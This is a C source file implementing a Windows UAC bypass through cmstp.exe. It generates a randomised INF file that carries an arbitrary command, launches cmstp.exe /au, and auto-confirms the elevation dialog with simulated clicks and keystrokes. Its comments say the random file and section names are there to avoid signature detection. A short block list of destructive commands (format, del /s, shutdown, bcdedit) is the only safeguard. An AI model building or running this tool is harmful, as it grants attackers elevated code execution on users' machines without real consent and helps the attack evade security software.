#include "cmstp_bypass.h"
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <time.h>
#include <stdarg.h>
#include <errno.h>
#include <tlhelp32.h>
#include <shlwapi.h>
#include <shellapi.h>

// Internal constants
#define MAX_COMMAND_LENGTH 2048
#define MAX_ATTEMPTS 150
#define SLEEP_INTERVAL 50
#define KEY_DELAY 300

// Internal function prototypes
static char* GeneratePolymorphicINF(const char* command, BOOL enableLogging);
static BOOL CreateINFFile(const char* infPath, const char* command, BOOL enableLogging);
static BOOL ExecuteCMSTP(const char* infPath, BOOL enableLogging);
static HWND FindCMSTPWindow(BOOL enableLogging);
static BOOL SetWindowActiveByHWND(HWND hwnd, BOOL enableLogging);
static BOOL SendEnterKey(HWND hwnd, BOOL enableLogging);
static BOOL ValidateCommand(const char* command, BOOL enableLogging);
static void LogMessage(BOOL enableLogging, const char* level, const char* format, ...);
static void CleanupTempFiles(const char* infPath, BOOL enableLogging);
static BOOL WaitForProcessStart(const char* processName, DWORD timeoutMs, BOOL enableLogging);

/**
 * Initialize a CMSTPConfig structure with default values
 */
void InitializeCMSTPConfig(CMSTPConfig* config) {
    if (!config) return;
    
    memset(config, 0, sizeof(CMSTPConfig));
    config->windowTimeout = 7500;
    config->confirmationDelay = 300;
    config->enableLogging = TRUE;
    config->cleanupFiles = TRUE;
    config->tempDirectory = NULL; // Use system temp
}

/**
 * Get a human-readable description of a CMSTPResult error code
 */
const char* GetCMSTPResultDescription(CMSTPResult result) {
    switch (result) {
        case CMSTP_SUCCESS:
            return "Operation completed successfully";
        case CMSTP_ERROR_INVALID_PARAMS:
            return "Invalid parameters provided";
        case CMSTP_ERROR_FILE_CREATION:
            return "Failed to create required files";
        case CMSTP_ERROR_PROCESS_START:
            return "Failed to start CMSTP process";
        case CMSTP_ERROR_WINDOW_NOT_FOUND:
            return "CMSTP window not found within timeout";
        case CMSTP_ERROR_CONFIRMATION_FAILED:
            return "Failed to confirm installation";
        case CMSTP_ERROR_TIMEOUT:
            return "Operation timed out";
        default:
            return "Unknown error";
    }
}

/**
 * Executes a command with elevated privileges using CMSTP bypass technique
 */
CMSTPResult ExecuteWithCMSTPBypass(const CMSTPConfig* config) {
    char tempPath[MAX_PATH];
    char infPath[MAX_PATH];
    HWND cmstpWindow = NULL;
    int attempts = 0;
    DWORD maxAttempts;
    
    // Validate input parameters
    if (!config || !config->command || strlen(config->command) == 0) {
        return CMSTP_ERROR_INVALID_PARAMS;
    }
    
    if (strlen(config->command) >= MAX_COMMAND_LENGTH) {
        LogMessage(config->enableLogging, "ERROR", "Command too long (max %d characters)", MAX_COMMAND_LENGTH - 1);
        return CMSTP_ERROR_INVALID_PARAMS;
    }
    
    // Validate command safety
    if (!ValidateCommand(config->command, config->enableLogging)) {
        LogMessage(config->enableLogging, "ERROR", "Invalid or potentially unsafe command");
        return CMSTP_ERROR_INVALID_PARAMS;
    }
    
    LogMessage(config->enableLogging, "INFO", "Starting CMSTP bypass operation");
    LogMessage(config->enableLogging, "INFO", "Target command: %s", config->command);
    
    // Get temp directory
    if (config->tempDirectory && strlen(config->tempDirectory) > 0) {
        strncpy(tempPath, config->tempDirectory, MAX_PATH - 1);
        tempPath[MAX_PATH - 1] = '\0';
    } else {
        if (GetTempPathA(MAX_PATH, tempPath) == 0) {
            LogMessage(config->enableLogging, "ERROR", "Could not get temp path (Error: %lu)", GetLastError());
            return CMSTP_ERROR_FILE_CREATION;
        }
    }
    
    // Ensure temp path ends with backslash
    size_t tempLen = strlen(tempPath);
    if (tempLen > 0 && tempPath[tempLen - 1] != '\\') {
        strcat(tempPath, "\\");
    }
    
    // Generate unique INF filename with randomization
    SYSTEMTIME st;
    GetLocalTime(&st);
    
    // Random filename prefixes to avoid signature detection
    const char* prefixes[] = {
        "Setup", "Config", "Profile", "Network", "Service", 
        "System", "App", "Device", "Core", "Install"
    };
    
    const char* suffixes[] = {
        "Cfg", "Prof", "Net", "Svc", "Sys", "App", "Dev", "Core", "Inst", "Mgr"
    };
    
    srand((unsigned int)time(NULL) + GetCurrentProcessId() + st.wMilliseconds);
    int prefixIdx = rand() % (sizeof(prefixes) / sizeof(prefixes[0]));
    int suffixIdx = rand() % (sizeof(suffixes) / sizeof(suffixes[0]));
    int randomNum = rand() % 9999;
    
    snprintf(infPath, sizeof(infPath), "%s%s_%s_%04d_%02d%02d%02d.inf", 
             tempPath, prefixes[prefixIdx], suffixes[suffixIdx], randomNum,
             st.wHour, st.wMinute, st.wSecond);
    
    LogMessage(config->enableLogging, "INFO", "INF file path: %s", infPath);
    
    // Create the INF file
    LogMessage(config->enableLogging, "INFO", "Creating INF profile...");
    if (!CreateINFFile(infPath, config->command, config->enableLogging)) {
        LogMessage(config->enableLogging, "ERROR", "Failed to create INF file");
        return CMSTP_ERROR_FILE_CREATION;
    }
    LogMessage(config->enableLogging, "SUCCESS", "INF file created successfully");
    
    // Execute CMSTP
    LogMessage(config->enableLogging, "INFO", "Launching CMSTP...");
    if (!ExecuteCMSTP(infPath, config->enableLogging)) {
        LogMessage(config->enableLogging, "ERROR", "Failed to launch CMSTP");
        if (config->cleanupFiles) {
            CleanupTempFiles(infPath, config->enableLogging);
        }
        return CMSTP_ERROR_PROCESS_START;
    }
    LogMessage(config->enableLogging, "SUCCESS", "CMSTP launched successfully");
    
    // Wait for CMSTP process to start
    LogMessage(config->enableLogging, "INFO", "Waiting for CMSTP process...");
    if (!WaitForProcessStart("cmstp.exe", 5000, config->enableLogging)) {
        LogMessage(config->enableLogging, "WARN", "CMSTP process not detected, continuing...");
    } else {
        LogMessage(config->enableLogging, "SUCCESS", "CMSTP process detected");
    }
    
    // Calculate max attempts based on timeout
    maxAttempts = (config->windowTimeout / SLEEP_INTERVAL);
    if (maxAttempts > MAX_ATTEMPTS) maxAttempts = MAX_ATTEMPTS;
    if (maxAttempts < 10) maxAttempts = 10; // Minimum attempts
    
    // Wait for CMSTP window to appear
    LogMessage(config->enableLogging, "INFO", "Waiting for CMSTP window...");
    
    do {
        Sleep(SLEEP_INTERVAL);
        cmstpWindow = FindCMSTPWindow(config->enableLogging);
        attempts++;
        
        // Show progress periodically
        if (attempts % (1000 / SLEEP_INTERVAL) == 0) {
            LogMessage(config->enableLogging, "INFO", "Still waiting for window... (attempt %d/%lu)", 
                      attempts, maxAttempts);
        }
        
        if (attempts > maxAttempts) {
            LogMessage(config->enableLogging, "ERROR", "Timeout: CMSTP window not found after %d attempts", attempts);
            if (config->cleanupFiles) {
                CleanupTempFiles(infPath, config->enableLogging);
            }
            return CMSTP_ERROR_WINDOW_NOT_FOUND;
        }
    } while (cmstpWindow == NULL);
    
    LogMessage(config->enableLogging, "SUCCESS", "CMSTP window found after %d attempts", attempts);
    
    // Activate window and confirm installation
    LogMessage(config->enableLogging, "INFO", "Activating window and confirming installation...");
    
    // Try multiple times with different delays
    BOOL confirmationSuccess = FALSE;
    for (int retryCount = 0; retryCount < 3 && !confirmationSuccess; retryCount++) {
        LogMessage(config->enableLogging, "DEBUG", "Confirmation attempt %d/3", retryCount + 1);
        
        if (SetWindowActiveByHWND(cmstpWindow, config->enableLogging)) {
            Sleep(config->confirmationDelay + (retryCount * 200)); // Increase delay on retries
            
            if (SendEnterKey(cmstpWindow, config->enableLogging)) {
                LogMessage(config->enableLogging, "SUCCESS", "Installation confirmed successfully on attempt %d", retryCount + 1);
                confirmationSuccess = TRUE;
            } else {
                LogMessage(config->enableLogging, "WARN", "Confirmation attempt %d failed, retrying...", retryCount + 1);
                Sleep(500); // Wait before retry
            }
        } else {
            LogMessage(config->enableLogging, "WARN", "Failed to activate window on attempt %d", retryCount + 1);
            Sleep(300);
        }
    }
    
    if (!confirmationSuccess) {
        LogMessage(config->enableLogging, "WARN", "All confirmation attempts failed, but command might have executed");
    }
    
    // Give CMSTP time to process
    Sleep(1500);
    
    // Cleanup
    if (config->cleanupFiles) {
        CleanupTempFiles(infPath, config->enableLogging);
        LogMessage(config->enableLogging, "INFO", "Cleanup completed");
    }
    
    LogMessage(config->enableLogging, "INFO", "CMSTP bypass operation completed");
    return CMSTP_SUCCESS;
}

// Internal implementation functions

/**
 * Creates an INF file for CMSTP processing
 */
static BOOL CreateINFFile(const char* infPath, const char* command, BOOL enableLogging) {
    FILE* file;
    char* content;
    
    if (!infPath || !command) {
        LogMessage(enableLogging, "ERROR", "CreateINFFile: Invalid parameters");
        return FALSE;
    }
    
    // Generate polymorphic INF content
    content = GeneratePolymorphicINF(command, enableLogging);
    if (!content) {
        LogMessage(enableLogging, "ERROR", "CreateINFFile: Failed to generate INF content");
        return FALSE;
    }
    
    // Create and write the file
    file = fopen(infPath, "w");
    if (file == NULL) {
        LogMessage(enableLogging, "ERROR", "CreateINFFile: Cannot create file %s (Error: %d)", infPath, errno);
        free(content);
        return FALSE;
    }
    
    size_t written = fwrite(content, 1, strlen(content), file);
    fclose(file);
    
    if (written != strlen(content)) {
        LogMessage(enableLogging, "ERROR", "CreateINFFile: Incomplete write to file");
        DeleteFileA(infPath);
        free(content);
        return FALSE;
    }
    
    LogMessage(enableLogging, "DEBUG", "CreateINFFile: Successfully created %s (%zu bytes)", infPath, written);
    free(content);
    return TRUE;
}

/**
 * Executes CMSTP.exe with the INF file
 */
static BOOL ExecuteCMSTP(const char* infPath, BOOL enableLogging) {
    STARTUPINFOA si;
    PROCESS_INFORMATION pi;
    char cmdLine[MAX_PATH * 3];
    
    if (!infPath) {
        LogMessage(enableLogging, "ERROR", "ExecuteCMSTP: Invalid INF path");
        return FALSE;
    }
    
    // Check if INF file exists
    if (GetFileAttributesA(infPath) == INVALID_FILE_ATTRIBUTES) {
        LogMessage(enableLogging, "ERROR", "ExecuteCMSTP: INF file does not exist: %s", infPath);
        return FALSE;
    }
    
    // Check if CMSTP exists
    if (GetFileAttributesA("C:\\Windows\\System32\\cmstp.exe") == INVALID_FILE_ATTRIBUTES) {
        LogMessage(enableLogging, "ERROR", "ExecuteCMSTP: CMSTP.exe not found");
        return FALSE;
    }
    
    ZeroMemory(&si, sizeof(si));
    si.cb = sizeof(si);
    ZeroMemory(&pi, sizeof(pi));
    
    // Construct command line
    int result = snprintf(cmdLine, sizeof(cmdLine), "C:\\Windows\\System32\\cmstp.exe /au \"%s\"", infPath);
    if (result < 0 || result >= sizeof(cmdLine)) {
        LogMessage(enableLogging, "ERROR", "ExecuteCMSTP: Command line too long");
        return FALSE;
    }
    
    LogMessage(enableLogging, "DEBUG", "ExecuteCMSTP: Executing: %s", cmdLine);
    
    // Start the process
    if (!CreateProcessA(NULL, cmdLine, NULL, NULL, FALSE, 0, NULL, NULL, &si, &pi)) {
        DWORD error = GetLastError();
        LogMessage(enableLogging, "ERROR", "ExecuteCMSTP: CreateProcess failed (Error: %lu)", error);
        return FALSE;
    }
    
    LogMessage(enableLogging, "DEBUG", "ExecuteCMSTP: Process started with PID %lu", pi.dwProcessId);
    
    CloseHandle(pi.hProcess);
    CloseHandle(pi.hThread);
    
    return TRUE;
}

/**
 * Finds the CMSTP window by various methods
 */
static HWND FindCMSTPWindow(BOOL enableLogging) {
    HWND hwnd = NULL;
    
    // Try to find window with exact title from PoC: "CorpVPN"
    hwnd = FindWindowA(NULL, "CorpVPN");
    if (hwnd != NULL) {
        LogMessage(enableLogging, "DEBUG", "FindCMSTPWindow: Found CorpVPN window");
        return hwnd;
    }
    
    // Also try our polymorphic service names
    const char* polymorphicNames[] = {
        "AppService", "NetService", "SystemCore", "DeviceHandler",
        "NetworkApp", "CoreService", "AppManager", "NetCore", NULL
    };
    
    for (int i = 0; polymorphicNames[i] != NULL; i++) {
        hwnd = FindWindowA(NULL, polymorphicNames[i]);
        if (hwnd != NULL) {
            LogMessage(enableLogging, "DEBUG", "FindCMSTPWindow: Found polymorphic window '%s'", polymorphicNames[i]);
            return hwnd;
        }
    }
    
    // Try other possible titles (English and French)
    const char* windowTitles[] = {
        "Connection Manager Profile Installer",
        "CMSTP",
        "Microsoft Connection Manager Profile Installer", 
        "Connection Manager",
        "Profile Installer",
        "Gestionnaire de connexions", // French
        "Programme d'installation de profil", // French
        "Installation du profil",
        "Installer le profil de connexion",
        NULL
    };
    
    for (int i = 0; windowTitles[i] != NULL; i++) {
        hwnd = FindWindowA(NULL, windowTitles[i]);
        if (hwnd != NULL) {
            LogMessage(enableLogging, "DEBUG", "FindCMSTPWindow: Found window with title '%s'", windowTitles[i]);
            return hwnd;
        }
    }
    
    // Search through all visible dialogs with more specific criteria
    hwnd = GetTopWindow(NULL);
    while (hwnd != NULL) {
        if (IsWindowVisible(hwnd)) {
            char className[256];
            char windowText[256];
            
            GetClassNameA(hwnd, className, sizeof(className));
            GetWindowTextA(hwnd, windowText, sizeof(windowText));
            
            // Check for dialog class and relevant text
            if (strcmp(className, "#32770") == 0 && strlen(windowText) > 0) {
                LogMessage(enableLogging, "DEBUG", "FindCMSTPWindow: Checking dialog - Class: %s, Text: '%s'", className, windowText);
                
                // More comprehensive text matching - include ANY dialog text since our polymorphic INF generates random names
                if (strstr(windowText, "CorpVPN") || 
                    strstr(windowText, "Connection") || 
                    strstr(windowText, "CMSTP") || 
                    strstr(windowText, "Profile") ||
                    strstr(windowText, "Installer") ||
                    strstr(windowText, "Rendre cette connexion") ||
                    strstr(windowText, "disponible") ||
                    strstr(windowText, "Gestionnaire") ||
                    strstr(windowText, "installation") ||
                    strstr(windowText, "profil") ||
                    strstr(windowText, "AppService") ||      // Our polymorphic names
                    strstr(windowText, "NetService") ||
                    strstr(windowText, "SystemCore") ||
                    strstr(windowText, "DeviceHandler") ||
                    strstr(windowText, "NetworkApp") ||
                    strstr(windowText, "CoreService") ||
                    strstr(windowText, "AppManager") ||
                    strstr(windowText, "NetCore")) {
                    
                    // Additional validation: check if it has OK/Install buttons
                    HWND testButton = FindWindowExA(hwnd, NULL, "Button", NULL);
                    if (testButton != NULL) {
                        LogMessage(enableLogging, "DEBUG", "FindCMSTPWindow: Found target dialog with text '%s' and has buttons", windowText);
                        return hwnd;
                    }
                }
            }
        }
        hwnd = GetNextWindow(hwnd, GW_HWNDNEXT);
    }
    
    LogMessage(enableLogging, "DEBUG", "FindCMSTPWindow: No suitable window found");
    return NULL;
}

/**
 * Activates a window and brings it to the foreground
 */
static BOOL SetWindowActiveByHWND(HWND hwnd, BOOL enableLogging) {
    if (hwnd == NULL || !IsWindow(hwnd)) {
        LogMessage(enableLogging, "ERROR", "SetWindowActiveByHWND: Invalid window handle");
        return FALSE;
    }
    
    LogMessage(enableLogging, "DEBUG", "SetWindowActiveByHWND: Activating window handle 0x%p", hwnd);
    
    // Show the window
    ShowWindow(hwnd, SW_RESTORE);
    ShowWindow(hwnd, SW_SHOW);
    
    // Try to bring to foreground
    if (!SetForegroundWindow(hwnd)) {
        LogMessage(enableLogging, "DEBUG", "SetWindowActiveByHWND: SetForegroundWindow failed, trying alternative");
        
        // Alternative method using thread attachment
        DWORD currentThreadId = GetCurrentThreadId();
        DWORD windowThreadId = GetWindowThreadProcessId(hwnd, NULL);
        
        if (windowThreadId != currentThreadId && windowThreadId != 0) {
            if (AttachThreadInput(currentThreadId, windowThreadId, TRUE)) {
                SetForegroundWindow(hwnd);
                SetFocus(hwnd);
                AttachThreadInput(currentThreadId, windowThreadId, FALSE);
                LogMessage(enableLogging, "DEBUG", "SetWindowActiveByHWND: Used thread attachment method");
            } else {
                LogMessage(enableLogging, "WARN", "SetWindowActiveByHWND: Thread attachment failed");
            }
        }
    } else {
        LogMessage(enableLogging, "DEBUG", "SetWindowActiveByHWND: SetForegroundWindow succeeded");
    }
    
    SetActiveWindow(hwnd);
    SetFocus(hwnd);
    
    return TRUE;
}

/**
 * Sends Enter key or clicks OK button to confirm installation
 */
static BOOL SendEnterKey(HWND hwnd, BOOL enableLogging) {
    if (hwnd == NULL || !IsWindow(hwnd)) {
        LogMessage(enableLogging, "ERROR", "SendEnterKey: Invalid window handle");
        return FALSE;
    }
    
    LogMessage(enableLogging, "DEBUG", "SendEnterKey: Attempting to confirm dialog");
    
    // Make sure window is active and focused first
    SetWindowActiveByHWND(hwnd, enableLogging);
    Sleep(200); // Give time for window to become active
    
    // Method 1: Find and click OK button by text (multiple languages)
    const char* buttonTexts[] = {"OK", "Oui", "Yes", "Continuer", "Continue", "Installer", "Install", NULL};
    
    for (int i = 0; buttonTexts[i] != NULL; i++) {
        HWND okButton = FindWindowExA(hwnd, NULL, "Button", buttonTexts[i]);
        if (okButton != NULL) {
            LogMessage(enableLogging, "DEBUG", "SendEnterKey: Found %s button, clicking it", buttonTexts[i]);
            
            // Multiple click attempts
            SendMessage(okButton, BM_CLICK, 0, 0);
            Sleep(100);
            PostMessage(okButton, BM_CLICK, 0, 0);
            Sleep(100);
            
            // Also try mouse click simulation
            RECT rect;
            if (GetWindowRect(okButton, &rect)) {
                int x = (rect.left + rect.right) / 2;
                int y = (rect.top + rect.bottom) / 2;
                SetCursorPos(x, y);
                Sleep(50);
                mouse_event(MOUSEEVENTF_LEFTDOWN, 0, 0, 0, 0);
                Sleep(50);
                mouse_event(MOUSEEVENTF_LEFTUP, 0, 0, 0, 0);
                LogMessage(enableLogging, "DEBUG", "SendEnterKey: Also sent mouse click at (%d, %d)", x, y);
            }
            
            return TRUE;
        }
    }
    
    // Method 2: Find button by standard IDs
    int buttonIds[] = {IDOK, IDYES, IDCONTINUE, 1, 6, 7, 0}; // Common button IDs
    
    for (int i = 0; buttonIds[i] != 0; i++) {
        HWND okButton = GetDlgItem(hwnd, buttonIds[i]);
        if (okButton != NULL && IsWindowVisible(okButton) && IsWindowEnabled(okButton)) {
            LogMessage(enableLogging, "DEBUG", "SendEnterKey: Found button with ID %d, clicking it", buttonIds[i]);
            
            SendMessage(okButton, BM_CLICK, 0, 0);
            Sleep(100);
            SendMessage(hwnd, WM_COMMAND, MAKEWPARAM(buttonIds[i], BN_CLICKED), (LPARAM)okButton);
            return TRUE;
        }
    }
    
    // Method 3: Send WM_COMMAND with common button IDs
    LogMessage(enableLogging, "DEBUG", "SendEnterKey: Trying WM_COMMAND approach");
    int commandIds[] = {IDOK, IDYES, IDCONTINUE, 1, 6, 7, 0};
    
    for (int i = 0; commandIds[i] != 0; i++) {
        if (SendMessage(hwnd, WM_COMMAND, MAKEWPARAM(commandIds[i], BN_CLICKED), 0) == 0) {
            LogMessage(enableLogging, "DEBUG", "SendEnterKey: WM_COMMAND with ID %d succeeded", commandIds[i]);
            return TRUE;
        }
    }
    
    // Method 4: Multiple keyboard approaches
    LogMessage(enableLogging, "DEBUG", "SendEnterKey: Trying keyboard input methods");
    
    // Focus the window first
    SetFocus(hwnd);
    SetActiveWindow(hwnd);
    Sleep(100);
    
    // Try Enter key with different approaches
    keybd_event(VK_RETURN, 0, 0, 0);
    Sleep(50);
    keybd_event(VK_RETURN, 0, KEYEVENTF_KEYUP, 0);
    Sleep(100);
    
    // Try PostMessage approach
    PostMessage(hwnd, WM_KEYDOWN, VK_RETURN, 0x001C0001);
    Sleep(50);
    PostMessage(hwnd, WM_KEYUP, VK_RETURN, 0xC01C0001);
    Sleep(100);
    
    // Try SendMessage approach
    SendMessage(hwnd, WM_KEYDOWN, VK_RETURN, 0x001C0001);
    Sleep(50);
    SendMessage(hwnd, WM_KEYUP, VK_RETURN, 0xC01C0001);
    Sleep(100);
    
    // Try Space key (sometimes works for default buttons)
    keybd_event(VK_SPACE, 0, 0, 0);
    Sleep(50);
    keybd_event(VK_SPACE, 0, KEYEVENTF_KEYUP, 0);
    Sleep(100);
    
    // Try Tab + Enter (to ensure focus on button)
    keybd_event(VK_TAB, 0, 0, 0);
    Sleep(50);
    keybd_event(VK_TAB, 0, KEYEVENTF_KEYUP, 0);
    Sleep(100);
    keybd_event(VK_RETURN, 0, 0, 0);
    Sleep(50);
    keybd_event(VK_RETURN, 0, KEYEVENTF_KEYUP, 0);
    
    LogMessage(enableLogging, "DEBUG", "SendEnterKey: Attempted multiple confirmation methods");
    return TRUE; // Return TRUE even if we're not sure, as one method might have worked
}

/**
 * Validates command for basic safety
 */
static BOOL ValidateCommand(const char* command, BOOL enableLogging) {
    if (!command || strlen(command) == 0) {
        return FALSE;
    }
    
    // Check for problematic patterns
    const char* restrictedPatterns[] = {
        "format ",
        "del /s",
        "rmdir /s", 
        "rd /s",
        "deltree",
        "shutdown",
        "restart",
        "bcdedit",
        "bootrec",
        NULL
    };
    
    char lowerCommand[MAX_COMMAND_LENGTH];
    strncpy(lowerCommand, command, sizeof(lowerCommand) - 1);
    lowerCommand[sizeof(lowerCommand) - 1] = '\0';
    _strlwr(lowerCommand);
    
    for (int i = 0; restrictedPatterns[i] != NULL; i++) {
        if (strstr(lowerCommand, restrictedPatterns[i]) != NULL) {
            LogMessage(enableLogging, "WARN", "ValidateCommand: Potentially unsafe pattern detected: %s", 
                      restrictedPatterns[i]);
            return FALSE;
        }
    }
    
    return TRUE;
}

/**
 * Logs a formatted message with timestamp and level
 */
static void LogMessage(BOOL enableLogging, const char* level, const char* format, ...) {
    if (!enableLogging) return;
    
    SYSTEMTIME st;
    GetLocalTime(&st);
    
    printf("[%02d:%02d:%02d.%03d] [%s] ", 
           st.wHour, st.wMinute, st.wSecond, st.wMilliseconds, level);
    
    va_list args;
    va_start(args, format);
    vprintf(format, args);
    va_end(args);
    
    printf("\n");
    fflush(stdout);
}

/**
 * Cleans up temporary files
 */
static void CleanupTempFiles(const char* infPath, BOOL enableLogging) {
    if (infPath && strlen(infPath) > 0) {
        if (DeleteFileA(infPath)) {
            LogMessage(enableLogging, "DEBUG", "CleanupTempFiles: Successfully deleted %s", infPath);
        } else {
            DWORD error = GetLastError();
            if (error != ERROR_FILE_NOT_FOUND) {
                LogMessage(enableLogging, "WARN", "CleanupTempFiles: Failed to delete %s (Error: %lu)", 
                          infPath, error);
            }
        }
    }
}

/**
 * Waits for a process to start
 */
static BOOL WaitForProcessStart(const char* processName, DWORD timeoutMs, BOOL enableLogging) {
    DWORD startTime = GetTickCount();
    
    while (GetTickCount() - startTime < timeoutMs) {
        HANDLE snapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
        if (snapshot != INVALID_HANDLE_VALUE) {
            PROCESSENTRY32 pe;
            pe.dwSize = sizeof(PROCESSENTRY32);
            
            if (Process32First(snapshot, &pe)) {
                do {
                    if (_stricmp(pe.szExeFile, processName) == 0) {
                        CloseHandle(snapshot);
                        return TRUE;
                    }
                } while (Process32Next(snapshot, &pe));
            }
            CloseHandle(snapshot);
        }
        Sleep(100);
    }
    
    return FALSE;
}

// Polymorphic INF generation function
static char* GeneratePolymorphicINF(const char* command, BOOL enableLogging) {
    // Seed random number generator
    srand((unsigned int)time(NULL) + GetCurrentProcessId());
    
    // Random section names and variable names
    const char* sectionNames[] = {
        "CoreSetup", "SystemConfig", "NetworkProfile", "ServiceInit", 
        "AppInstall", "DeviceSetup", "UserProfile", "SecurityConfig"
    };
    
    const char* serviceNames[] = {
        "NetService", "AppManager", "SystemCore", "DeviceHandler",
        "NetworkApp", "CoreService", "AppService", "NetCore"
    };
    
    const char* commandSections[] = {
        "PreInstallCommands", "InitCommands", "SetupCommands", 
        "ConfigCommands", "StartupCommands", "SystemCommands"
    };
    
    const char* destSections[] = {
        "CustomInstallDest", "SystemDestination", "AppDestination",
        "ServiceDestination", "CoreDestination", "NetworkDestination"
    };
    
    // Random comments and spacing
    const char* comments[] = {
        "; Configuration file for system setup",
        "; Network profile installation",
        "; Application deployment configuration", 
        "; System service initialization",
        "; Device configuration profile",
        "; User environment setup"
    };
    
    // Select random elements
    int sectIdx = rand() % (sizeof(sectionNames) / sizeof(sectionNames[0]));
    int svcIdx = rand() % (sizeof(serviceNames) / sizeof(serviceNames[0]));
    int cmdIdx = rand() % (sizeof(commandSections) / sizeof(commandSections[0]));
    int destIdx = rand() % (sizeof(destSections) / sizeof(destSections[0]));
    int commIdx = rand() % (sizeof(comments) / sizeof(comments[0]));
    
    // Random registry values
    int regVal1 = 49000 + (rand() % 1000);
    int regVal2 = regVal1 + 1;
    
    // Allocate buffer for polymorphic INF
    char* content = malloc(4096);
    if (!content) {
        LogMessage(enableLogging, "ERROR", "GeneratePolymorphicINF: Memory allocation failed");
        return NULL;
    }
    
    // Generate random spacing and empty lines
    int extraLines = rand() % 3;
    char spacing[10] = "";
    for (int i = 0; i < extraLines; i++) {
        strcat(spacing, "\n");
    }
    
    // Build polymorphic INF content
    snprintf(content, 4096,
        "[version]%s\n"
        "Signature=$chicago$\n"
        "AdvancedINF=2.5\n"
        "%s\n"
        "[DefaultInstall]\n"
        "CustomDestination=%sAllUsers\n"
        "RunPreSetupCommands=%s\n"
        "%s\n"
        "[%s]\n"
        "%s\n"
        "%s\n"
        "taskkill /IM cmstp.exe /F\n"
        "%s\n"
        "[%sAllUsers]\n"
        "%d,%d=%s_Section, 7\n"
        "%s\n"
        "[%s_Section]\n"
        "\"HKLM\", \"SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\App Paths\\CMMGR32.EXE\", \"ProfileInstallPath\", \"%%%%UnexpectedError%%%%\", \"\"\n"
        "%s\n"
        "[Strings]\n"
        "ServiceName=\"%s\"\n"
        "ShortSvcName=\"%s\"\n",
        spacing,
        spacing,
        destSections[destIdx],
        commandSections[cmdIdx],
        spacing,
        commandSections[cmdIdx],
        comments[commIdx],
        command,
        spacing,
        destSections[destIdx],
        regVal1, regVal2, sectionNames[sectIdx],
        spacing,
        sectionNames[sectIdx],
        spacing,
        serviceNames[svcIdx],
        serviceNames[svcIdx]
    );
    
    LogMessage(enableLogging, "DEBUG", "GeneratePolymorphicINF: Generated unique INF template");
    return content;
}
